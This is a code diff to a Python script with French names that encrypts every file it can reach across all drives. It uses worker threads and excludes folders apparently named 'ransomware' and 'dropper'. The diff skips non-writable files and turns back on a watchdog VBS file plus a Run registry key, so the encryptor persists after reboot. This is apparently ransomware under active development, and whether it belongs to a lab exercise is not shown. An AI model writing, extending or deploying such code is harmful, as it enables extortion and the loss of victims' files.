@@ -77,7 +77,8 @@ folders_exclus = [
     ".vscode",
     "ransomware",
     "sysmon",
-    "script-mitgation"
+    "script-mitgation",
+    "dropper"
 ]
 
 vbsFile = []
@@ -299,6 +300,10 @@ def get_existing_root_path():
             root_paths.append(drive)
     return root_paths
 
+
+def est_accessible_en_ecriture(fichier):
+    return os.access(fichier, os.W_OK)
+
 def encrypte_file(input_file):
     backend = default_backend()
     iv = os.urandom(16)
@@ -330,7 +335,7 @@ def worker(queue):
         if file is None:
             break
         try:
-            if is_in_excluded_folder(file):
+            if is_in_excluded_folder(file) or not est_accessible_en_ecriture(file):
                 continue
             if file.is_file() and file.suffix.lower() not in extensions_exclues :
                 encrypte_file(str(file))
@@ -399,8 +404,8 @@ def main():
     existDir = os.path.dirname(os.path.abspath(__file__))
     if existDir.lower() not in folders_exclus:
         folders_exclus.append(existDir.lower())
-        # Exécuter une seule fois au lieu d'une boucle infinie
-     #create_watchdog_vbs()
+     # Exécuter une seule fois au lieu d'une boucle infinie
+    create_watchdog_vbs()
     time.sleep(0.5)
     ajouter_run_key_watchdog()
     time.sleep(0.5)
